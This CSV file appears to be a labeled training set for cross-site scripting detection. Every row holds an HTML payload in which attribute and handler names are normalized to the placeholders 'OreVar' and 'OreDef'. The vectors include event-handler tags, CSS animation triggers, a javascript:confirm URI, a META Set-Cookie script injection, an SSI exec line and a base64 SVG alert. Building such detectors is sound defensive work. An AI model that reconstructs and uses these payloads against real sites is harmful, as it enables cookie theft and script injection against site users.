1,"< style > @keyframes x{} < /style > < del OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /del >"
1,"< image OreVar = OreDef ( 1 ) "" contenteditable > test < /image >"
1,"< textarea OreVar = OreDef ( 1 ) "" contenteditable > test < /textarea >"
1,< bdo OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /bdo >
1,< kbd OreVar = OreDef ( 1 ) > XSS < /kbd >
1,"< element OreVar = OreDef ( 1 ) "" > test < /element >"
1,"< style > @keyframes x{} < /style > < tbody OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /tbody >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < address OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /address >"
1,"< meter OreVar = OreDef ( 1 ) "" contenteditable > test < /meter >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < figcaption OreVar = OreDef ( 1 ) contenteditable > drop here < /figcaption >"
1,< sup OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /sup > < input OreVar = y autofocus >
1,"< cite OreVar = OreDef ( 1 ) "" contenteditable > test < /cite >"
1,"< xmp OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /xmp >"
1,< svg > < applet OreVar = OreDef ( 1 ) > < /applet >
1,< details OreVar = OreDef ( 1 ) > XSS < /details >
1,< plaintext OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /plaintext > < input autofocus >
1,< frameset OreVar = OreDef ( 1 ) >
1,< th OreVar = OreDef ( 1 ) > XSS < /th >
1,"< body OreVar = OreDef ( 1 ) "" contenteditable > test < /body >"
1,"< style > :target {color:red ; } < /style > < html OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /html >"
1,< svg > < rt OreVar = OreDef ( 1 ) > < /rt >
1,< noframes OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /noframes > < input autofocus >
1,"< A OreVar = ""http://google:ha.ckers.org"" > < /A >"
1,< bdi OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /bdi >
1,< canvas OreVar = OreDef ( 1 ) > XSS < /canvas >
1,"< acronym OreVar = OreDef ( 1 ) "" contenteditable > test < /acronym >"
1,"< strong OreVar = OreDef ( 1 ) "" contenteditable > test < /strong >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < caption OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /caption >"
1,"< rtc OreVar = OreDef ( 1 ) "" > test < /rtc >"
1,"< rt OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /rt >"
1,"< strike OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /strike >"
1,< aside OreVar = OreDef ( 1 ) > XSS < /aside >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < basefont OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /basefont >"
1,"< style > @keyframes x{} < /style > < td OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /td >"
1,"< style > @keyframes x{} < /style > < address OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /address >"
1,< picture OreVar = OreDef ( 1 ) > XSS < /picture >
1,< bdi OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /bdi >
1,"< object OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /object >"
1,"< mark OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /mark >"
1,"< time OreVar = OreDef ( 1 ) "" > test < /time >"
1,"< q OreVar = OreDef ( 1 ) "" contenteditable > test < /q >"
1,"< rtc OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /rtc >"
1,"< param OreVar = OreDef ( 1 ) "" > test < /param >"
1,"< q OreVar = OreDef ( 1 ) "" > test < /q >"
1,< image3 OreVar = OreDef ( 1 ) > XSS < /image3 >
1,< svg > < listing OreVar = OreDef ( 1 ) > < /listing >
1,"< base OreVar = OreDef ( 1 ) "" contenteditable > test < /base >"
1,"< STYLE OreVar = ""text/css"" > BODY{background:url ( OreVar ( OreVar ) "" ) } < /STYLE >"
1,"< caption OreVar = OreDef ( 1 ) "" contenteditable > test < /caption >"
1,"< data OreVar = OreDef ( 1 ) "" > test < /data >"
1,< input2 OreVar = OreDef ( 1 ) > XSS < /input2 >
1,< caption OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /caption >
1,"< track OreVar = OreDef ( 1 ) "" contenteditable > test < /track >"
1,"< bdi OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /bdi >"
1,"< tbody OreVar = OreDef ( 1 ) "" contenteditable > test < /tbody >"
1,< h1 OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /h1 > < input OreVar = y autofocus >
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < hgroup OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /hgroup >"
1,< section OreVar = OreDef ( 1 ) > XSS < /section >
1,"< address OreVar = OreDef ( 1 ) "" contenteditable > test < /address >"
1,"< li OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /li >"
1,"< section OreVar = OreDef ( 1 ) "" > test < /section >"
1,"< menuitem OreVar = OreDef ( 1 ) "" contenteditable > test < /menuitem >"
1,"< footer OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /footer >"
1,"< button OreVar = OreDef ( 1 ) "" > test < /button >"
1,"< dl OreVar = OreDef ( 1 ) "" contenteditable > test < /dl >"
1,"< figure OreVar = OreDef ( 1 ) "" > test < /figure >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < big OreVar = OreDef ( 1 ) contenteditable > drop here < /big >"
1,< listing OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /listing > < input autofocus >
1,"< style > :target {color:red ; } < /style > < area OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /area >"
1,"< abbr OreVar = OreDef ( 1 ) "" > test < /abbr >"
1,"< content OreVar = OreDef ( 1 ) "" > test < /content >"
1,"< style > :target {color:red ; } < /style > < param OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /param >"
1,"< main OreVar = OreDef ( 1 ) "" contenteditable > test < /main >"
1,< iframe OreVar = OreDef ( 1 ) > XSS < /iframe >
1,< canvas OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /canvas >
1,"< style > @keyframes x{} < /style > < datalist OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /datalist >"
1,"< BODY OreVar = OreDef ( '' ) "" >"
1,"< area OreVar = OreDef ( 1 ) "" contenteditable > test < /area >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < s OreVar = OreDef ( 1 ) contenteditable > drop here < /s >"
1,"< image OreVar = OreDef ( 1 ) "" contenteditable > test < /image >"
1,= OreDef ( '' OreVar
1,< head OreVar = OreDef ( 1 ) > XSS < /head >
1,"< nav OreVar = OreDef ( 1 ) "" contenteditable > test < /nav >"
1,< fieldset OreVar = OreDef ( 1 ) > XSS < /fieldset >
1,"< samp OreVar = OreDef ( 1 ) "" contenteditable > test < /samp >"
1,< hr OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /hr >
1,"< style > :target {color:red ; } < /style > < legend OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /legend >"
1,"< style > @keyframes slidein {} < /style > < a OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /a >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < p OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /p >"
1,setTimeout (
1,"< basefont OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /basefont >"
1,"< colgroup OreVar = OreDef ( 1 ) "" contenteditable > test < /colgroup >"
1,< rb OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /rb >
1,< body OreVar = OreDef ( 1 ) >
1,< link OreVar = OreDef ( 1 ) > XSS < /link >
1,"< meter OreVar = OreDef ( 1 ) "" > test < /meter >"
1,"< div OreVar = OreDef ( 1 ) "" contenteditable > test < /div >"
1,< a OreVar = OreDef ( 1 ) > XSS < /a >
1,< element OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /element > < input OreVar = y autofocus >
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < html OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /html >"
1,"< textarea OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /textarea >"
1,"< mark OreVar = OreDef ( 1 ) "" contenteditable > test < /mark >"
1,"< legend OreVar = OreDef ( 1 ) "" > test < /legend >"
1,"< style > @keyframes slidein {} < /style > < bgsound OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /bgsound >"
1,"< hgroup OreVar = OreDef ( 1 ) "" contenteditable > test < /hgroup >"
1,"< tr OreVar = OreDef ( 1 ) "" > test < /tr >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < sub OreVar = OreDef ( 1 ) contenteditable > drop here < /sub >"
1,< dt OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /dt > < input autofocus >
1,< details OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /details >
1,"< strike OreVar = OreDef ( 1 ) "" > test < /strike >"
1,"< ol OreVar = OreDef ( 1 ) "" > test < /ol >"
1,"< style > :target {color:red ; } < /style > < acronym OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /acronym >"
1,"< keygen OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /keygen >"
1,< pre OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /pre >
1,< noframes OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /noframes >
1,< p OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /p > < input autofocus >
1,"< abbr OreVar = OreDef ( 1 ) "" contenteditable > test < /abbr >"
1,"< style > @keyframes x{} < /style > < image OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /image >"
1,"< sup OreVar = OreDef ( 1 ) "" contenteditable > test < /sup >"
1,"< footer OreVar = OreDef ( 1 ) "" contenteditable > test < /footer >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < code OreVar = OreDef ( 1 ) contenteditable > drop here < /code >"
1,"< frameset OreVar = OreDef ( 1 ) "" > test < /frameset >"
1,< dl OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /dl >
1,"< pre OreVar = OreDef ( 1 ) "" contenteditable > test < /pre >"
1,< svg > < rb OreVar = OreDef ( 1 ) > < /rb >
1,< option OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /option >
1,"< table OreVar = OreDef ( 1 ) "" contenteditable > test < /table >"
1,"< tfoot OreVar = OreDef ( 1 ) "" > test < /tfoot >"
1,< svg > < noembed OreVar = OreDef ( 1 ) > < /noembed >
1,"< OreVar = ""http://.rocks/.js"" > < /SCRIPT >"
1,< base OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /base > < input autofocus >
1,"< hgroup OreVar = OreDef ( 1 ) "" > test < /hgroup >"
1,"< big OreVar = OreDef ( 1 ) "" contenteditable > test < /big >"
1,"< object OreVar = OreDef ( 1 ) "" contenteditable > test < /object >"
1,"< td OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /td >"
1,"< s OreVar = OreDef ( 1 ) "" contenteditable > test < /s >"
1,"< source OreVar = OreDef ( 1 ) "" contenteditable > test < /source >"
1,< script OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /script >
1,"< details OreVar = OreDef ( 1 ) "" contenteditable > test < /details >"
1,< noscript OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /noscript >
1,"< abbr OreVar = OreDef ( 1 ) "" contenteditable > test < /abbr >"
1,"< nextid OreVar = OreDef ( 1 ) "" contenteditable > test < /nextid >"
1,< figure OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /figure > < input autofocus >
1,"< blink OreVar = OreDef ( 1 ) "" contenteditable > test < /blink >"
1,"< video OreVar = OreDef ( 1 ) "" > test < /video >"
1,"< noembed OreVar = OreDef ( 1 ) "" > test < /noembed >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < hr OreVar = OreDef ( 1 ) contenteditable > drop here < /hr >"
1,< table OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /table >
1,"< dfn OreVar = OreDef ( 1 ) "" contenteditable > test < /dfn >"
1,"< command OreVar = OreDef ( 1 ) "" > test < /command >"
1,"< noembed OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /noembed >"
1,< br OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /br > < input autofocus >
1,< fieldset OreVar = OreDef ( 1 ) > XSS < /fieldset >
1,< ruby OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /ruby > < input autofocus >
1,"< style > :target {color:red ; } < /style > < hr OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /hr >"
1,"< section OreVar = OreDef ( 1 ) "" > test < /section >"
1,"< noembed OreVar = OreDef ( 1 ) "" > test < /noembed >"
1,"< section OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /section >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < article OreVar = OreDef ( 1 ) contenteditable > drop here < /article >"
1,"OreVar = ""data:image/svg+xml ; base64 , PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh OreVar OreVar = "" OreVar = ""image/svg+xml"" OreVar = ""always"""
1,< hgroup OreVar = OreDef ( 1 ) > XSS < /hgroup >
1,"< ruby OreVar = OreDef ( 1 ) "" > test < /ruby >"
1,"< map OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /map >"
1,"< tt OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /tt >"
1,"< style > @keyframes x{} < /style > < dt OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /dt >"
1,< meta OreVar = OreDef ( 1 ) > XSS < /meta >
1,"< style > @keyframes slidein {} < /style > < thead OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /thead >"
1,"< tr OreVar = OreDef ( 1 ) "" contenteditable > test < /tr >"
1,< hr OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /hr >
1,"< content OreVar = OreDef ( 1 ) "" contenteditable > test < /content >"
1,"< s OreVar = OreDef ( 1 ) "" > test < /s >"
1,< head OreVar = OreDef ( 1 ) > XSS < /head >
1,"< style > @keyframes x{} < /style > < style OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /style >"
1,< figcaption OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /figcaption > < input autofocus >
1,< svg > < pre OreVar = OreDef ( 1 ) > < /pre >
1,"< figure OreVar = OreDef ( 1 ) "" contenteditable > test < /figure >"
1,"< style > :target {color:red ; } < /style > < dd OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /dd >"
1,"< rp OreVar = OreDef ( 1 ) "" contenteditable > test < /rp >"
1,"< address OreVar = OreDef ( 1 ) "" > test < /address >"
1,< ol OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /ol > < input autofocus >
1,"< META OreVar = ""Set-Cookie"" OreVar = OreVar = < SCRIPT > alert ( OreVar ) < /SCRIPT > "" >"
1,< header OreVar = OreDef ( 1 ) > XSS < /header >
1,"< strike OreVar = OreDef ( 1 ) "" contenteditable > test < /strike >"
1,"< image OreVar = OreDef ( 1 ) "" contenteditable > test < /image >"
1,"< OreVar = ""javaSCRIPT&colon ; confirm&lpar ; 1&rpar ; """
1,"< pre OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /pre >"
1,"< style > :target {color: red ; } < /style > < head OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /head >"
1,"< style > :target {color: red ; } < /style > < article OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /article >"
1,"< basefont OreVar = OreDef ( 1 ) "" contenteditable > test < /basefont >"
1,"META OreVar = ""Set-Cookie"" OreVar = OreVar = < SCRIPT > alert ( OreVar ) < /SCRIPT > "" >"
1,"< style > @keyframes slidein {} < /style > < sup OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /sup >"
1,"< canvas OreVar = OreDef ( 1 ) "" > test < /canvas >"
1,"< nobr OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /nobr >"
1,"< dt OreVar = OreDef ( 1 ) "" > test < /dt >"
1,< map OreVar = OreDef ( 1 ) > XSS < /map >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < em OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /em >"
1,"< dfn OreVar = OreDef ( 1 ) "" contenteditable > test < /dfn >"
1,"< menu OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /menu >"
1,"< !--#exec OreVar = ""/bin/echo ' < SCR'""-- >"
1,"< style > :target {color:red ; } < /style > < menu OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /menu >"
1,"< optgroup OreVar = OreDef ( 1 ) "" contenteditable > test < /optgroup >"
1,"< style > @keyframes x{} < /style > < cite OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /cite >"
1,"< h1 OreVar = OreDef ( 1 ) "" contenteditable > test < /h1 >"
1,"< style > @keyframes x{} < /style > < dfn OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /dfn >"
1,< ins OreVar = OreDef ( 1 ) > XSS < /ins >
1,< kbd OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /kbd > < input OreVar = y autofocus >
1,"< map OreVar = OreDef ( 1 ) "" contenteditable > test < /map >"
1,< th OreVar = OreDef ( 1 ) > XSS < /th >
1,"< style > :target {color: red ; } < /style > < cite OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /cite >"
1,< q OreVar = OreDef ( 1 ) > XSS < /q >
1,< legend OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /legend >
1,"< param OreVar = OreDef ( 1 ) "" > test < /param >"
1,"< style > @keyframes slidein {} < /style > < body OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /body >"
1,< svg > < meter OreVar = OreDef ( 1 ) > < /meter >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < dl OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /dl >"
1,< input OreVar = OreDef ( 1 ) > XSS < /input >
1,"< col OreVar = OreDef ( 1 ) "" > test < /col >"
1,"< ol OreVar = OreDef ( 1 ) "" contenteditable > test < /ol >"
1,"< li OreVar = OreDef ( 1 ) "" contenteditable > test < /li >"
1,< rt OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /rt > < input autofocus >
1,< title OreVar = OreDef ( 1 ) > XSS < /title >
1,< nobr OreVar = OreDef ( 1 ) > XSS < /nobr >
1,< bdi OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /bdi > < input OreVar = y autofocus >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < wbr OreVar = OreDef ( 1 ) contenteditable > drop here < /wbr >"
1,"< canvas OreVar = OreDef ( 1 ) "" > test < /canvas >"
1,< address OreVar = OreDef ( 1 ) > XSS < /address >
1,"< p OreVar = OreDef ( 1 ) "" > test < /p >"
1,"< multicol OreVar = OreDef ( 1 ) "" > test < /multicol >"
1,"< bdo OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /bdo >"
1,"< th OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /th >"
1,< legend OreVar = OreDef ( 1 ) > XSS < /legend >
1,"< dir OreVar = OreDef ( 1 ) "" > test < /dir >"
1,< optgroup OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /optgroup >
1,< dd OreVar = OreDef ( 1 ) > XSS < /dd >
1,< style OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /style > < input autofocus >
1,< applet OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /applet >
1,"< summary OreVar = OreDef ( 1 ) "" contenteditable > test < /summary >"
1,"< ul OreVar = OreDef ( 1 ) "" > test < /ul >"
1,"< blockquote OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /blockquote >"
1,"< keygen OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /keygen >"
1,"< aside OreVar = OreDef ( 1 ) "" > test < /aside >"
1,"< bgsound OreVar = OreDef ( 1 ) "" contenteditable > test < /bgsound >"
1,"< ul OreVar = OreDef ( 1 ) "" > test < /ul >"
1,"< summary OreVar = OreDef ( 1 ) "" contenteditable > test < /summary >"
1,"< xmp OreVar = OreDef ( 1 ) "" contenteditable > test < /xmp >"
1,"< dir OreVar = OreDef ( 1 ) "" contenteditable > test < /dir >"
1,< iframe OreVar = OreDef ( 1 ) > XSS < /iframe >
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < map OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /map >"
1,< custom tags OreVar = OreDef ( 1 ) > XSS < /custom tags >
1,"< xmp OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /xmp >"
1,< textarea OreVar = OreDef ( 1 ) autofocus > < /textarea >
1,< option OreVar = OreDef ( 1 ) OreVar = 1 OreVar = x > < /option > < input autofocus >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < abbr OreVar = OreDef ( 1 ) contenteditable > drop here < /abbr >"
1,"< img OreVar = OreDef ( 1 ) "" contenteditable > test < /img >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < s OreVar = OreDef ( 1 ) contenteditable > drop here < /s >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < hr OreVar = OreDef ( 1 ) contenteditable > drop here < /hr >"
1,< ins OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /ins > < input OreVar = y autofocus >
1,"< td OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /td >"
1,"< big OreVar = OreDef ( 1 ) "" contenteditable > test < /big >"
1,"< table OreVar = OreDef ( 1 ) "" contenteditable > test < /table >"
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < details OreVar = OreDef ( 1 ) contenteditable > drop here < /details >"
1,< hr OreVar = OreDef ( 1 ) > XSS < /hr >
1,"< nav OreVar = OreDef ( 1 ) "" contenteditable > test < /nav >"
1,"< summary OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /summary >"
1,< data OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /data >
1,"< label OreVar = OreDef ( 1 ) "" contenteditable > test < /label >"
1,"< cite OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /cite >"
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < big OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /big >"
1,"< style > :target {transform: rotate ( OreVar ) ; } < /style > < cite OreVar = x OreVar = ""transition:transform 2s"" OreVar = OreDef ( 1 ) > < /cite >"
1,"< style > @keyframes slidein {} < /style > < aside OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /aside >"
1,"< style > @keyframes slidein {} < /style > < object OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /object >"
1,"< element OreVar = OreDef ( 1 ) "" > test < /element >"
1,< ins OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /ins >
1,< input OreVar = radio OreVar = x OreVar = OreDef ( 1 ) >
1,"< style > :target {color: red ; } < /style > < del OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /del >"
1,< nobr OreVar = OreDef ( 1 ) > XSS < /nobr >
1,"< caption OreVar = OreDef ( 1 ) "" contenteditable > test < /caption >"
1,"< style > :target {color: red ; } < /style > < area OreVar = x OreVar = ""transition:color 10s"" OreVar = OreDef ( 1 ) > < /area >"
1,"< footer OreVar = OreDef ( 1 ) "" > test < /footer >"
1,"< button OreVar = ""true"" OreVar = OreDef ( 1 ) "" > test < /button >"
1,< style OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /style >
1,"< style > @keyframes x{from {left:0 ; }to {left: 1000px ; }}:target {animation:10s ease-in-out 0s 1 x ; } < /style > < track OreVar = x OreVar = ""position:absolute ; "" OreVar = OreDef ( 1 ) "" > < /track >"
1,< keygen OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /keygen >
1,"< sub OreVar = OreDef ( 1 ) "" contenteditable > test < /sub >"
1,< s OreVar = OreDef ( 1 ) > XSS < /s >
1,"< mark OreVar = OreDef ( 1 ) "" contenteditable > test < /mark >"
1,< var OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /var > < input OreVar = y autofocus >
1,"< style > @keyframes x{} < /style > < a OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /a >"
1,< th OreVar = x OreVar = 1 OreVar = OreDef ( 1 ) > < /th >
1,"< progress OreVar = OreDef ( 1 ) "" > test < /progress >"
1,"< xmp OreVar = OreDef ( 1 ) "" > test < /xmp >"
1,< script OreVar = OreDef ( 1 ) > XSS < /script >
1,"< optgroup OreVar = OreDef ( 1 ) "" contenteditable > test < /optgroup >"
1,"< frame OreVar = OreDef ( 1 ) "" > test < /frame >"
1,"< style > @keyframes slidein {} < /style > < blink OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /blink >"
1,< s OreVar = OreDef ( 1 ) > XSS < /s >
1,< shadow OreVar = OreDef ( 1 ) > XSS < /shadow >
1,"< table OreVar = OreDef ( 1 ) "" contenteditable > test < /table >"
1,"< img OreVar = OreDef ( 1 ) "" > test < /img >"
1,"< img OreVar = OreDef ( 1 ) "" > test < /img >"
1,"< style > :target {color:red ; } < /style > < object OreVar = x OreVar = ""transition:color 1s"" OreVar = OreDef ( 1 ) > < /object >"
1,< input OreVar = OreDef ( 1 ) OreVar = x > < input autofocus >
1,"< div OreVar = ""true"" contenteditable > drag me < /div > < bdo OreVar = OreDef ( 1 ) contenteditable > drop here < /bdo >"
1,"< style > @keyframes x{} < /style > < font OreVar = ""animation-name:x"" OreVar = OreDef ( 1 ) "" > < /font >"
1,"< style > @keyframes slidein {} < /style > < var OreVar = ""animation-duration:1s ; animation-name:slidein ; animation-iteration-count:2"" OreVar = OreDef ( 1 ) "" > < /var >"
